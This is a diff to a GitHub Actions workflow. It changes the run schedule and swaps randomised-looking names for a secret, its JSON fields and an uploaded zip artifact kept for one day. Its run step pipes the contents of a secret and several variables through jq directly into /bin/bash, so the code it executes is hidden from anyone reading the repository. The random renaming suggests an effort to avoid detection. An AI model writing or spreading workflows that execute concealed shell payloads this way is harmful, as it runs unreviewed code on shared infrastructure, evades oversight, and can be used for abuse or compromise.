@@ -3,7 +3,7 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '13 0,6,12,18 * * *'
+    - cron: '17 1,7,13,19 * * *'
 permissions:
   contents: read
   actions: read
@@ -16,16 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Run pipeline
         env:
-          pcp6698: ${{ secrets.pcp6698 }}
+          gox9872: ${{ secrets.gox9872 }}
         run: |
-          printf '%s' "$pcp6698" | jq -r .pewit3 | /bin/bash
-          echo $s740 | jq -r .v4988 | /bin/bash
-          echo $nqt8577 | jq -r .y5 | /bin/bash
-          echo $n239 | jq -r .ix36416 | /bin/bash
+          printf '%s' "$gox9872" | jq -r .kujp8410 | /bin/bash
+          echo $bvj0686 | jq -r .fu8 | /bin/bash
+          echo $nim5862 | jq -r .st72 | /bin/bash
+          echo $hwps1069 | jq -r .ibhh00 | /bin/bash
+          echo $udde164 | jq -r .tr88734 | /bin/bash
+          echo $gvxj8482 | jq -r .lbqh833 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
         with:
-          name: m3drOeVT
+          name: zM7usx3a
           path: "*.zip"
           retention-days: 1
